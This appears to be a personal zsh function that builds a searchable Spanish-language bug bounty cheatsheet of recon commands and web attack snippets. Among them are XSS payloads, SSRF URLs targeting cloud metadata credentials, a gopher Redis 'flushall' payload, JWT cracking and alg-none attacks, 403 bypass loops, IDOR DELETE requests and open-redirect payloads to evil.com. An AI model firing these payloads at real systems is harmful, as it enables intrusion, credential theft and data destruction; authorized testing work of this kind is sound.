# bbref — cheatsheet interactivo de bug bounty
# ENTER copia el snippet al portapapeles.
# Busca por técnica, categoría, herramienta o keyword.
# -------------------------
bbref() {
  emulate -L zsh
  setopt local_options no_aliases

  local content=""
  local selected=""
  local snippet=""

  _bb_section() {
    local title="$1"
    content+="\n=== ${title} ===\n"
    content+="NOMBRE\tCATEGORÍA\tSNIPPET\n"
  }

  _bb_add() {
    local name="$1"
    local cat="$2"
    local snippet="$3"
    content+="${name}\t${cat}\t${snippet}\n"
  }

  _bb_copy() {
    local value="$1"
    if command -v pbcopy >/dev/null 2>&1; then
      printf '%s' "$value" | pbcopy
    elif command -v wl-copy >/dev/null 2>&1; then
      printf '%s' "$value" | wl-copy
    elif command -v xclip >/dev/null 2>&1; then
      printf '%s' "$value" | xclip -selection clipboard
    else
      print -r -- "[!] No hay pbcopy/wl-copy/xclip. Snippet: $value" >&2
      return 1
    fi
  }

  # ─────────────────────────────────────────────────────────────
  _bb_section "SETUP / VARIABLES"
  _bb_add "export-vars"        "setup"   'export TARGET="ejemplo"; export T="$HUNTING_HOME/targets/$TARGET"; export DOMAIN="ejemplo.com"; export LIVE="$T/http/live.txt"; export HTTPX="$T/http/httpx.jsonl"'
  _bb_add "mkdir-estructura"   "setup"   'mkdir -p $T/{recon,http,fuzz,js/{content,endpoints},in,out,tmp,burp,notes,reports,loot,meta}'
  _bb_add "program-init"       "setup"   'program-init <programa>'
  _bb_add "scope-program"      "setup"   'scope-program <programa>'
  _bb_add "mktarget"           "setup"   'mktarget <dominio>'
  _bb_add "scope"              "setup"   'scope <dominio>'

  # ─────────────────────────────────────────────────────────────
  _bb_section "RECON — SUBDOMINIOS"
  _bb_add "subfinder-single"   "recon"   'subfinder -d $DOMAIN -all -recursive -silent -o $T/recon/subs-subfinder.txt'
  _bb_add "subfinder-multi"    "recon"   'subfinder -dL $T/in/roots.txt -all -silent -o $T/recon/subs-subfinder.txt'
  _bb_add "assetfinder"        "recon"   'cat $T/in/roots.txt | assetfinder --subs-only > $T/recon/subs-assetfinder.txt'
  _bb_add "amass-pasivo"       "recon"   'amass enum -passive -df $T/in/roots.txt -o $T/recon/subs-amass.txt -timeout 30'
  _bb_add "merge-subs"         "recon"   'cat $T/recon/subs-*.txt | sort -u | anew $T/recon/subdomains-all.txt && wc -l $T/recon/subdomains-all.txt'
  _bb_add "dnsx-resolve"       "recon"   'dnsx -l $T/recon/subdomains-all.txt -silent -o $T/recon/subdomains-resolved.txt'
  _bb_add "dnsx-records"       "recon"   'dnsx -l $T/recon/subdomains-all.txt -a -cname -mx -json -o $T/recon/dns-records.jsonl -silent'
  _bb_add "subscan"            "recon"   'subscan <dominio>'
  _bb_add "takeover-subjack"   "recon"   'subjack -w $T/recon/subdomains-resolved.txt -t 50 -timeout 30 -ssl -o $T/recon/takeover-candidates.txt'
  _bb_add "takeover-nuclei"    "recon"   'nuclei -l $LIVE -tags takeover -rate-limit 20 -o $T/recon/nuclei-takeover.txt -silent'

  # ─────────────────────────────────────────────────────────────
  _bb_section "RECON — HTTP PROBING"
  _bb_add "httpx-full"         "httpx"   'httpx -l $T/recon/subdomains-resolved.txt -title -status-code -content-length -tech-detect -follow-redirects -random-agent -threads 50 -timeout 10 -json -o $HTTPX -silent'
  _bb_add "httpx-live"         "httpx"   'cat $HTTPX | jq -r ".url" | sort -u > $LIVE && wc -l $LIVE'
  _bb_add "httpx-status-dist"  "httpx"   'cat $HTTPX | jq -r ".status_code" | sort | uniq -c | sort -rn'
  _bb_add "httpx-techs"        "httpx"   'cat $HTTPX | jq -r ".technologies[]?" | sort | uniq -c | sort -rn | head -20'
  _bb_add "httpx-tsv"          "httpx"   'cat $HTTPX | jq -r "[.status_code, .url, .title] | @tsv" | sort -k1 -n'
  _bb_add "httpx-interesting"  "httpx"   'cat $HTTPX | jq -r ".url" | grep -iE "api|auth|admin|graphql|swagger|v[0-9]|oauth|sso|login|portal|dashboard"'
  _bb_add "httpx-403s"         "httpx"   'cat $HTTPX | jq -r "select(.status_code == 403) | .url"'
  _bb_add "httpx-401s"         "httpx"   'cat $HTTPX | jq -r "select(.status_code == 401) | .url"'
  _bb_add "httpx-big-responses" "httpx"  'cat $HTTPX | jq -r "select(.content_length > 50000) | [.content_length, .url] | @tsv" | sort -k1 -rn | head -20'
  _bb_add "gowitness-scan"     "httpx"   'gowitness scan file -f $LIVE --screenshot-path $T/recon/screenshots/ --threads 10'
  _bb_add "gowitness-serve"    "httpx"   'gowitness report serve --address 0.0.0.0:7171'

  # ─────────────────────────────────────────────────────────────
  _bb_section "RECON — URLs Y PARÁMETROS"
  _bb_add "waybackurls"        "urls"    'cat $T/in/roots.txt | waybackurls | anew $T/recon/wayback.txt'
  _bb_add "gau"                "urls"    'cat $T/in/roots.txt | gau --blacklist png,jpg,gif,svg,woff,woff2,ttf,eot,ico,css --threads 10 | anew $T/recon/gau.txt'
  _bb_add "merge-urls-hist"    "urls"    'cat $T/recon/wayback.txt $T/recon/gau.txt | sort -u | anew $T/http/urls-historical.txt'
  _bb_add "params-raw"         "urls"    'cat $T/http/urls-historical.txt | grep "?" | uro | anew $T/fuzz/params-raw.txt'
  _bb_add "params-interesting" "urls"    'cat $T/fuzz/params-raw.txt | grep -iE "[?&](id|user_?id|account|uid|uuid|pid|file|path|url|redirect|return|token|key|ref|src|dest|target|doc|order|invoice)=" | sort -u > $T/fuzz/params-interesting.txt'
  _bb_add "params-freq"        "urls"    'cat $T/fuzz/params-raw.txt | grep -oE "[?&][a-zA-Z_-]+=" | sort | uniq -c | sort -rn | head -30'
  _bb_add "katana-crawl"       "urls"    'katana -list $LIVE -depth 3 -js-crawl -known-files all -concurrency 20 -timeout 10 -o $T/recon/katana.txt -silent'
  _bb_add "webmap"             "urls"    'webmap <dominio>'
  _bb_add "paramhunt-v2"       "urls"    'paramhunt-v2 <dominio>'
  _bb_add "uro-dedup"          "urls"    'cat $T/http/urls-historical.txt | uro | sort -u > $T/http/urls-deduped.txt'
  _bb_add "qsreplace-fuzz"     "urls"    'cat $T/fuzz/params-raw.txt | qsreplace "FUZZ7TEST" | httpx -silent -mc 200 -mr "FUZZ7TEST" > $T/fuzz/reflected-params.txt'

  # ─────────────────────────────────────────────────────────────
  _bb_section "RECON — JAVASCRIPT"
  _bb_add "js-desde-httpx"     "js"      'cat $HTTPX | jq -r "select(.content_type != null) | select(.content_type | contains(\"javascript\")) | .url" > $T/js/files.txt'
  _bb_add "js-desde-katana"    "js"      'cat $T/recon/katana.txt $T/http/urls-historical.txt | grep -iE "\.js(\?|$)" | sort -u | anew $T/js/files.txt'
  _bb_add "js-subjs"           "js"      'cat $LIVE | subjs -c 20 | anew $T/js/files.txt'
  _bb_add "js-download"        "js"      'mkdir -p $T/js/content; while IFS= read -r url; do fname=$(printf "%s" "$url" | md5 | cut -c1-8); curl -sk --max-time 10 "$url" -o "$T/js/content/${fname}.js"; done < $T/js/files.txt'
  _bb_add "js-endpoints"       "js"      'grep -rhoE "[a-zA-Z0-9_./-]{3,}" $T/js/content/ | grep "^/" | grep -v "\.png\|\.jpg\|\.css\|\.woff" | sort -u > $T/js/endpoints-found.txt'
  _bb_add "js-secrets"         "js"      'grep -rhoiE "(api[_-]?key|apikey|secret[_-]?key|access[_-]?token|client[_-]?secret|aws_access)[=:]+[A-Za-z0-9+/=_.-]{8,}" $T/js/content/ > $T/js/secrets-candidates.txt'
  _bb_add "js-urls"            "js"      'grep -rhoE "https?://[a-zA-Z0-9._/:-]+" $T/js/content/ | grep -viE "cdn|fonts|google|analytics|facebook|twitter|jquery|bootstrap" | sort -u > $T/js/urls-found.txt'
  _bb_add "js-staging-domains" "js"      'grep -rhoiE "[a-z0-9-]+\.(internal|staging|dev|test|corp|local|preprod|uat)\.[a-z]{2,}" $T/js/content/ | sort -u'
  _bb_add "js-uuids"           "js"      'grep -rhoE "[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}" $T/js/content/ | sort -u'
  _bb_add "trufflehog"         "js"      'trufflehog filesystem $T/js/content/ --json 2>/dev/null | jq .'

  # ─────────────────────────────────────────────────────────────
  _bb_section "NUCLEI"
  _bb_add "nuclei-update"      "nuclei"  'nuclei -update-templates && nuclei -version'
  _bb_add "nuclei-mhc"         "nuclei"  'nuclei -l $LIVE -severity medium,high,critical -rate-limit 50 -bulk-size 25 -concurrency 10 -json-export $T/recon/nuclei-mhc.jsonl -o $T/recon/nuclei-mhc.txt -silent'
  _bb_add "nuclei-exposure"    "nuclei"  'nuclei -l $LIVE -tags exposure,misconfig,config -severity low,medium,high,critical -rate-limit 30 -o $T/recon/nuclei-exposure.txt -silent'
  _bb_add "nuclei-cves"        "nuclei"  'nuclei -l $LIVE -tags cve -severity medium,high,critical -rate-limit 30 -o $T/recon/nuclei-cves.txt -silent'
  _bb_add "nuclei-panels"      "nuclei"  'nuclei -l $LIVE -tags panel,login -rate-limit 30 -o $T/recon/nuclei-panels.txt -silent'
  _bb_add "nuclei-defaultcreds" "nuclei" 'nuclei -l $LIVE -tags default-login -rate-limit 20 -o $T/recon/nuclei-defaultcreds.txt -silent'
  _bb_add "nuclei-tech"        "nuclei"  'nuclei -l $LIVE -tags tech -rate-limit 50 -o $T/recon/nuclei-tech.txt -silent'
  _bb_add "nuclei-autoselect"  "nuclei"  'nuclei -u https://TARGET -as -rate-limit 30 -o $T/recon/nuclei-app.txt -silent'
  _bb_add "nuclei-parse-high"  "nuclei"  'cat $T/recon/nuclei-mhc.jsonl | jq -r "select(.info.severity == \"high\" or .info.severity == \"critical\") | [.info.severity, .info.name, .matched_at] | @tsv"'
  _bb_add "nuclei-parse-all"   "nuclei"  'cat $T/recon/nuclei-mhc.jsonl | jq -r "[.info.severity, .info.name, .host] | @tsv" | sort'

  # ─────────────────────────────────────────────────────────────
  _bb_section "FUZZING — ffuf / feroxbuster"
  _bb_add "ffuf-dirs"          "fuzzing" 'ffuf -u https://TARGET/FUZZ -w ~/tools/SecLists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,201,204,301,302,307,401,403 -ac -rate 50 -t 40 -o $T/fuzz/ffuf-dirs.json -of json -silent'
  _bb_add "ffuf-files"         "fuzzing" 'ffuf -u https://TARGET/FUZZ -w ~/tools/SecLists/Discovery/Web-Content/raft-medium-files.txt -e .php,.asp,.aspx,.jsp,.json,.xml,.bak,.old,.txt,.conf,.config,.env,.log -mc 200,201,204 -ac -rate 50 -t 40 -o $T/fuzz/ffuf-files.json -of json -silent'
  _bb_add "ffuf-params"        "fuzzing" 'ffuf -u "https://TARGET/api/endpoint?FUZZ=test" -w ~/tools/SecLists/Discovery/Web-Content/burp-parameter-names.txt -mc 200 -ac -rate 30 -t 20 -o $T/fuzz/ffuf-params.json -of json -silent'
  _bb_add "ffuf-idor-int"      "fuzzing" 'ffuf -u "https://TARGET/api/orders?id=FUZZ" -w ~/tools/SecLists/Fuzzing/Integers/Integers.txt -mc 200 -ac -rate 20 -t 10 -o $T/fuzz/ffuf-idor.json -of json -silent'
  _bb_add "ffuf-swagger"       "fuzzing" 'ffuf -u https://TARGET/FUZZ -w <(printf "%s\n" swagger swagger-ui api-docs api/swagger v1/swagger.json v2/api-docs openapi.json openapi.yaml .well-known/api-catalog) -mc 200 -silent'
  _bb_add "ffuf-graphql"       "fuzzing" 'ffuf -u https://TARGET/FUZZ -w <(printf "%s\n" graphql graphiql api/graphql v1/graphql graph) -mc 200 -silent'
  _bb_add "ffuf-403bypass"     "fuzzing" 'ffuf -u https://TARGET/FUZZ -w ~/tools/SecLists/Discovery/Web-Content/raft-small-words.txt -H "X-Forwarded-For: 127.0.0.1" -H "X-Original-URL: /admin/" -mc 200,302 -ac -rate 30 -t 20 -silent'
  _bb_add "ffuf-parse"         "fuzzing" 'cat $T/fuzz/ffuf-dirs.json | jq -r ".results[] | [.status, .length, .url] | @tsv" | sort -k1 -n'
  _bb_add "feroxbuster"        "fuzzing" 'feroxbuster -u https://TARGET -w ~/tools/SecLists/Discovery/Web-Content/raft-medium-directories.txt -x php,asp,aspx,jsp,json,conf,bak -C 404,429 --rate-limit 50 --depth 3 -o $T/fuzz/ferox-output.txt --quiet'
  _bb_add "fuzzdirs"           "fuzzing" 'fuzzdirs <url>'

  # ─────────────────────────────────────────────────────────────
  _bb_section "IDOR"
  _bb_add "idor-find-ids"      "idor"    'cat $T/http/urls-historical.txt | grep -oE "[?&/][a-z_-]*(id|uid|user|account|order|doc|file|ref|invoice)[=/_][0-9a-zA-Z-]+" | sort -u'
  _bb_add "idor-api-paths"     "idor"    'cat $T/js/endpoints-found.txt | grep -iE "/[a-z]+/[0-9]+|/[a-z]+/\{[a-z_]+\}"'
  _bb_add "idor-extract-uuids" "idor"    'grep -rhoE "[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}" $T/js/content/ | sort -u'
  _bb_add "idor-hints"         "idor"    'idor-hints'
  _bb_add "idor-curl-get"      "idor"    'curl -sk -H "Authorization: Bearer $TOKEN" https://TARGET/api/v1/resource/ID_AJENO | jq .'
  _bb_add "idor-curl-put"      "idor"    'curl -sk -X PUT -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d "{\"status\":\"cancelled\"}" https://TARGET/api/v1/resource/ID_AJENO | jq .'
  _bb_add "idor-curl-delete"   "idor"    'curl -sk -X DELETE -H "Authorization: Bearer $TOKEN" https://TARGET/api/v1/resource/ID_AJENO | jq .'
  _bb_add "idor-no-auth"       "idor"    'curl -sk https://TARGET/api/v1/resource/ID | jq .'

  # ─────────────────────────────────────────────────────────────
  _bb_section "AUTH Y JWT"
  _bb_add "jwt-decode"         "auth"    'jwt-decode <token>'
  _bb_add "jwt-decode-manual"  "auth"    'echo $JWT | cut -d"." -f1 | base64 -d 2>/dev/null; echo; echo $JWT | cut -d"." -f2 | base64 -d 2>/dev/null; echo'
  _bb_add "jwt-tool-playbook"  "auth"    'jwt_tool $JWT -t https://TARGET/api/endpoint -M pb'
  _bb_add "jwt-tool-none"      "auth"    'jwt_tool $JWT -X a'
  _bb_add "jwt-tool-rs256hs256" "auth"   'jwt_tool $JWT -X s'
  _bb_add "jwt-tool-crack"     "auth"    'jwt_tool $JWT -C -d ~/tools/SecLists/Passwords/Leaked-Databases/rockyou-50.txt'
  _bb_add "jwt-hashcat"        "auth"    'hashcat -a 0 -m 16500 "$JWT" ~/tools/SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt'
  _bb_add "jwks-endpoint"      "auth"    'curl -sk https://TARGET/.well-known/jwks.json | jq .'
  _bb_add "openid-config"      "auth"    'curl -sk https://TARGET/.well-known/openid-configuration | jq .'
  _bb_add "session-post-logout" "auth"   'curl -sk -H "Cookie: session=SESSION_VIEJA" https://TARGET/api/v1/me | jq .'

  # ─────────────────────────────────────────────────────────────
  _bb_section "XSS"
  _bb_add "xss-reflected-detect" "xss"  'cat $T/fuzz/params-raw.txt | qsreplace "XSS7TEST" | httpx -silent -mc 200 -mr "XSS7TEST" > $T/fuzz/reflected-params.txt'
  _bb_add "dalfox-pipe"        "xss"    'cat $T/fuzz/params-raw.txt | dalfox pipe --skip-bav --silence -o $T/fuzz/dalfox-results.txt'
  _bb_add "dalfox-single"      "xss"    'dalfox url "https://TARGET/page?param=FUZZ" -o $T/fuzz/dalfox-single.txt'
  _bb_add "xss-html-body"      "xss"    '<svg onload=alert(document.domain)>'
  _bb_add "xss-img-onerror"    "xss"    '<img src=x onerror=alert(1)>'
  _bb_add "xss-details"        "xss"    '<details open ontoggle=alert(1)>'
  _bb_add "xss-attr-escape"    "xss"    '" onmouseover="alert(1)'
  _bb_add "xss-attr-autofocus" "xss"    '" autofocus onfocus="alert(1)'
  _bb_add "xss-js-string"      "xss"    '";alert(1)//'
  _bb_add "xss-js-single"      "xss"    "';alert(1)//"
  _bb_add "xss-case-bypass"    "xss"    '<ScRiPt>alert(1)</ScRiPt>'
  _bb_add "xss-template-lit"   "xss"    '<script>alert`1`</script>'
  _bb_add "xss-no-space"       "xss"    '<svg/onload=alert(1)>'
  _bb_add "xss-iframe-srcdoc"  "xss"    '<iframe srcdoc="<script>alert(1)<\/script>">'
  _bb_add "xss-href-js"        "xss"    'javascript:alert(document.domain)'
  _bb_add "xss-detect-marker"  "xss"    '<>"'"'"'&;/MARK7TEST'

  # ─────────────────────────────────────────────────────────────
  _bb_section "SSRF"
  _bb_add "ssrf-params"        "ssrf"   'cat $T/fuzz/params-raw.txt | grep -iE "[?&](url|src|href|dest|redirect|uri|path|file|img|link|callback|webhook|proxy|service|host|endpoint|fetch|load|resource)="'
  _bb_add "ssrf-interactsh"    "ssrf"   'interactsh-client'
  _bb_add "ssrf-aws-meta"      "ssrf"   'http://169.254.169.254/latest/meta-data/'
  _bb_add "ssrf-aws-creds"     "ssrf"   'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
  _bb_add "ssrf-gcp-meta"      "ssrf"   'http://metadata.google.internal/computeMetadata/v1/'
  _bb_add "ssrf-azure-meta"    "ssrf"   'http://169.254.169.254/metadata?api-version=2019-06-01'
  _bb_add "ssrf-redis"         "ssrf"   'http://localhost:6379'
  _bb_add "ssrf-elastic"       "ssrf"   'http://localhost:9200'
  _bb_add "ssrf-bypass-ipv6"   "ssrf"   'http://[::ffff:169.254.169.254]'
  _bb_add "ssrf-bypass-hex"    "ssrf"   'http://0xA9FEA9FE'
  _bb_add "ssrf-bypass-decimal" "ssrf"  'http://2852039166'
  _bb_add "ssrf-gopher-redis"  "ssrf"   'gopher://localhost:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a'
  _bb_add "ssrf-curl-test"     "ssrf"   'curl -sk "https://TARGET/fetch?url=https://INTERACTSH_URL/test"'

  # ─────────────────────────────────────────────────────────────
  _bb_section "CSRF"
  _bb_add "csrf-check-token"   "csrf"   'curl -sk -X POST https://TARGET/action -H "Cookie: SESSION" -d "csrf_token=AAAA&param=val" | head -20'
  _bb_add "csrf-no-token"      "csrf"   'curl -sk -X POST https://TARGET/action -H "Cookie: SESSION" -d "param=val" | head -20'
  _bb_add "csrf-samesite-lax"  "csrf"   'DevTools → Application → Cookies → busca SameSite en la cookie de sesión'
  _bb_add "csrf-burp-poc"      "csrf"   'Burp → clic derecho en request → Engagement Tools → Generate CSRF PoC'

  # ─────────────────────────────────────────────────────────────
  _bb_section "ACCESS CONTROL / 403 BYPASS"
  _bb_add "403-path-variations" "authz"  'for path in "/admin" "/admin/" "//admin" "/%2fadmin" "/admin%20" "/admin%09" "/admin.json" "/admin.html" "/admin..;" "/admin/." "/%61dmin" "/ADMIN"; do code=$(curl -sk -o /dev/null -w "%{http_code}" "https://TARGET$path"); [[ $code != "403" && $code != "404" ]] && echo "$code → $path"; done'
  _bb_add "403-header-bypass"  "authz"   'for h in "X-Original-URL: /admin" "X-Rewrite-URL: /admin" "X-Custom-IP-Authorization: 127.0.0.1" "X-Forwarded-For: 127.0.0.1" "X-Forwarded-Host: localhost" "X-Real-IP: 127.0.0.1"; do code=$(curl -sk -o /dev/null -w "%{http_code}" "https://TARGET/" -H "$h"); [[ $code != "403" && $code != "404" ]] && echo "$code → $h"; done'
  _bb_add "403-curl-noauth"    "authz"   'curl -sk https://TARGET/admin/users -H "Authorization: Bearer TOKEN_NORMAL" | jq .'
  _bb_add "403-method-probe"   "authz"   'for m in GET POST PUT PATCH DELETE OPTIONS HEAD; do code=$(curl -sk -X $m -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $TOKEN" "https://TARGET/api/v1/resource/123"); echo "$m → $code"; done'
  _bb_add "403-options"        "authz"   'curl -sk -X OPTIONS https://TARGET/api/v1/users -v 2>&1 | grep -i "allow:"'
  _bb_add "privesc-js-admin"   "authz"   'grep -r "admin" $T/js/content/ | grep -iE "url|path|endpoint|route" | sort -u'

  # ─────────────────────────────────────────────────────────────
  _bb_section "API Y GRAPHQL"
  _bb_add "api-versioning"     "api"     'for v in v1 v2 v3 v0 v1.0 v2.0; do code=$(curl -sk -o /dev/null -w "%{http_code}" "https://TARGET/api/$v/"); echo "$v → $code"; done'
  _bb_add "graphql-introspect" "api"     'curl -s -X POST https://TARGET/graphql -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" -d "{\"query\":\"{__schema{types{name fields{name}}}}\"}" | jq .'
  _bb_add "graphql-field-suggest" "api"  'curl -s -X POST https://TARGET/graphql -H "Content-Type: application/json" -d "{\"query\":\"{user{noexiste}}\"}" | jq .'
  _bb_add "graphql-mutation-unauth" "api" 'curl -s -X POST https://TARGET/graphql -H "Content-Type: application/json" -d "{\"query\":\"mutation{deleteUser(id:\\\"123\\\"){success}}\"}" | jq .'
  _bb_add "mass-assignment"    "api"     'curl -sk -X PUT https://TARGET/api/v1/profile -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" -d "{\"name\":\"test\",\"email\":\"t@t.com\",\"role\":\"admin\",\"is_admin\":true,\"credits\":9999}" | jq .'
  _bb_add "api-data-exposure"  "api"     'curl -sk -H "Authorization: Bearer $TOKEN" https://TARGET/api/v1/me | jq . | grep -iE "admin|role|permission|flag|is_|internal|api_key|token"'
  _bb_add "api-swagger-probe"  "api"     'for p in swagger swagger-ui api-docs v1/swagger.json v2/api-docs openapi.json openapi.yaml; do code=$(curl -sk -o /dev/null -w "%{http_code}" "https://TARGET/$p"); [[ $code == "200" ]] && echo "HIT → $p"; done'

  # ─────────────────────────────────────────────────────────────
  _bb_section "NMAP"
  _bb_add "nmap-quick"         "nmap"    'nmap -sV -sC --open -T4 -oA $T/recon/nmap-quick $DOMAIN'
  _bb_add "nmap-allports"      "nmap"    'nmap -p- --min-rate 5000 -T4 --open -oA $T/recon/nmap-allports $DOMAIN'
  _bb_add "nmap-versions"      "nmap"    'nmap -sV -sC -p PUERTOS -oA $T/recon/nmap-versions $DOMAIN'
  _bb_add "nmap-scope"         "nmap"    'nmap -sV -sC --open -T4 -iL $T/recon/subdomains-resolved.txt -oA $T/recon/nmap-scope'
  _bb_add "nmap-http"          "nmap"    'nmap --script http-headers,http-methods -p 80,443,8080,8443 $DOMAIN'
  _bb_add "nmap-waf"           "nmap"    'nmap --script http-waf-detect -p 80,443 $DOMAIN'
  _bb_add "nmap-ssl"           "nmap"    'nmap --script ssl-enum-ciphers -p 443 $DOMAIN'
  _bb_add "nmap-risky-ports"   "nmap"    'grep -E "6379|27017|9200|9300|5432|3306|8080|8443|4848|7001|8161|5601|2181" $T/recon/nmap-allports.gnmap'

  # ─────────────────────────────────────────────────────────────
  _bb_section "ANÁLISIS — jq / grep"
  _bb_add "jq-200s"            "análisis" 'cat $HTTPX | jq -r "select(.status_code == 200) | .url"'
  _bb_add "jq-500s"            "análisis" 'cat $HTTPX | jq -r "select(.status_code >= 500) | [.status_code, .url] | @tsv"'
  _bb_add "jq-by-tech"         "análisis" 'cat $HTTPX | jq -r "select(.technologies | length > 0) | [.url, (.technologies | join(\",\"))] | @tsv"'
  _bb_add "jq-admin-titles"    "análisis" 'cat $HTTPX | jq -r "select(.title | test(\"admin|login|portal|dashboard\"; \"i\")) | [.url, .title] | @tsv"'
  _bb_add "grep-ips"           "análisis" 'grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" archivo.txt'
  _bb_add "grep-emails"        "análisis" 'grep -oiE "[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}" archivo.txt'
  _bb_add "grep-urls"          "análisis" 'grep -oE "https?://[a-zA-Z0-9._/?&=%-]+" archivo.txt'
  _bb_add "grep-params-freq"   "análisis" 'grep -oE "[?&][a-zA-Z_-]+=" archivo.txt | sort | uniq -c | sort -rn'
  _bb_add "grep-secrets-generic" "análisis" 'grep -rhoiE "(password|secret|api_key|token|auth)[\"'"'"'\s:=]+[A-Za-z0-9+/=_.-]{8,}" $T/ 2>/dev/null | grep -v ".git" | sort -u'

  # ─────────────────────────────────────────────────────────────
  _bb_section "RACE CONDITIONS"
  _bb_add "race-run"           "race"    'race-run <request.txt> [n=20]'
  _bb_add "race-burst"         "race"    'race-burst <request.txt> [n=10]'
  _bb_add "race-turbo-intruder" "race"   'Burp → clic derecho → Extensions → Turbo Intruder → race-single-packet-attack.py'
  _bb_add "race-curl-parallel" "race"    'for _ in $(seq 1 20); do curl -sk -X POST https://TARGET/api/redeem -H "Authorization: Bearer $TOKEN" -d "{\"code\":\"PROMO\"}" & done; wait'

  # ─────────────────────────────────────────────────────────────
  _bb_section "OPEN REDIRECT"
  _bb_add "redirect-params"    "redirect" 'cat $T/fuzz/params-raw.txt | grep -iE "[?&](redirect|return|next|url|dest|go|continue|target|redir|r|u)=" | head -30'
  _bb_add "redirect-payload"   "redirect" 'https://TARGET/login?redirect=https://evil.com'
  _bb_add "redirect-bypass-1"  "redirect" 'https://TARGET/login?redirect=//evil.com'
  _bb_add "redirect-bypass-2"  "redirect" 'https://TARGET/login?redirect=\/\/evil.com'
  _bb_add "redirect-bypass-3"  "redirect" 'https://TARGET/login?redirect=https:evil.com'
  _bb_add "redirect-bypass-4"  "redirect" 'https://TARGET/login?redirect=https://TARGET.evil.com'
  _bb_add "redirect-bypass-5"  "redirect" 'https://TARGET/login?redirect=https://evil.com%23TARGET'

  # ─────────────────────────────────────────────────────────────
  _bb_section "SUBDOMAIN TAKEOVER"
  _bb_add "takeover-cname"     "takeover" 'dnsx -l $T/recon/subdomains-all.txt -cname -json -silent | jq -r "select(.cname != null) | [.host, .cname[]] | @tsv"'
  _bb_add "takeover-nxdomain"  "takeover" 'dnsx -l $T/recon/subdomains-all.txt -silent -rcode nxdomain -o $T/recon/nxdomain.txt'
  _bb_add "takeover-subjack"   "takeover" 'subjack -w $T/recon/subdomains-resolved.txt -t 50 -timeout 30 -ssl -o $T/recon/takeover.txt'
  _bb_add "takeover-nuclei"    "takeover" 'nuclei -l $T/recon/subdomains-all.txt -tags takeover -rate-limit 20 -o $T/recon/nuclei-takeover.txt -silent'

  # ─────────────────────────────────────────────────────────────
  _bb_section "BUSINESS LOGIC"
  _bb_add "logic-price-tamper" "logic"   'Burp Repeater → interceptar checkout → cambiar price/amount/quantity a 0 o negativo → ¿acepta?'
  _bb_add "logic-coupon-reuse" "logic"   'Aplicar mismo cupón dos veces en requests paralelas (race). Usar race-run.'
  _bb_add "logic-skip-step"    "logic"   'Flujo de pago en 3 pasos → capturar URL del paso 3 → acceder directamente sin pasar por 1 y 2'
  _bb_add "logic-negative-qty" "logic"   'curl -sk -X POST https://TARGET/cart -H "Authorization: Bearer $TOKEN" -d "{\"item_id\":\"123\",\"quantity\":-1}" | jq .'
  _bb_add "logic-param-pollute" "logic"  'GET /transfer?amount=100&amount=0 → ¿cuál toma el servidor?'
  _bb_add "logic-account-limit" "logic"  'Crear múltiples recursos hasta límite → intentar crear uno más con race condition'

  # ─────────────────────────────────────────────────────────────
  _bb_section "CLOUD / MISCONFIGS"
  _bb_add "s3-list-public"     "cloud"   'aws s3 ls s3://BUCKET_NAME --no-sign-request'
  _bb_add "s3-download"        "cloud"   'aws s3 cp s3://BUCKET_NAME/file.txt . --no-sign-request'
  _bb_add "s3-enum-common"     "cloud"   'for sub in $DOMAIN www api static assets media files backup img; do curl -sk -o /dev/null -w "$sub → %{http_code}\n" "https://$sub.s3.amazonaws.com/"; done'
  _bb_add "firebase-exposed"   "cloud"   'curl -sk "https://PROYECTO.firebaseio.com/.json" | jq . | head -20'
  _bb_add "gcp-metadata"       "cloud"   'curl -sk -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/ | jq .'
  _bb_add "azure-metadata"     "cloud"   'curl -sk -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2019-06-01" | jq .'
  _bb_add "env-file-probe"     "cloud"   'for f in .env .env.local .env.production .env.backup config.json appsettings.json; do code=$(curl -sk -o /dev/null -w "%{http_code}" "https://TARGET/$f"); [[ $code == "200" ]] && echo "HIT → $f"; done'

  # ─────────────────────────────────────────────────────────────
  _bb_section "REPORTE / DOCUMENTACIÓN"
  _bb_add "hunt-doctor"        "reporte" 'hunt-doctor'
  _bb_add "claude-recon-v2"    "reporte" 'claude-recon-v2 <dominio>'
  _bb_add "claude-hypotheses-v2" "reporte" 'claude-hypotheses-v2 <dominio>'
  _bb_add "notas-target"       "reporte" 'nvim $T/notes/summary.md'
  _bb_add "loot-dir"           "reporte" 'ls -la $T/loot/'

  # ─────────────────────────────────────────────────────────────
  content="${content#\\n}"

  if command -v fzf >/dev/null 2>&1; then
    selected="$(printf '%b' "$content" | column -ts $'\t' | fzf \
      --ansi \
      --no-sort \
      --reverse \
      --header='bbref — ENTER copia el snippet · busca por técnica/categoría/tool · ESC para salir')" || return 0

    # Extraer el snippet: es la tercera columna — todo lo que hay tras el segundo bloque de espacios
    snippet="$(printf '%s' "$selected" | sed 's/^[^ ]*[[:space:]][[:space:]]*[^ ]*[[:space:]][[:space:]]*//')"

    [[ -n "$snippet" && "$snippet" != "SNIPPET" && "$snippet" != "===" ]] || return 0
    _bb_copy "$snippet" && print -r -- "[+] Copiado al portapapeles: $snippet"
  elif command -v column >/dev/null 2>&1; then
    printf '%b' "$content" | column -ts $'\t' | less
  else
    printf '%b' "$content" | less
  fi
}
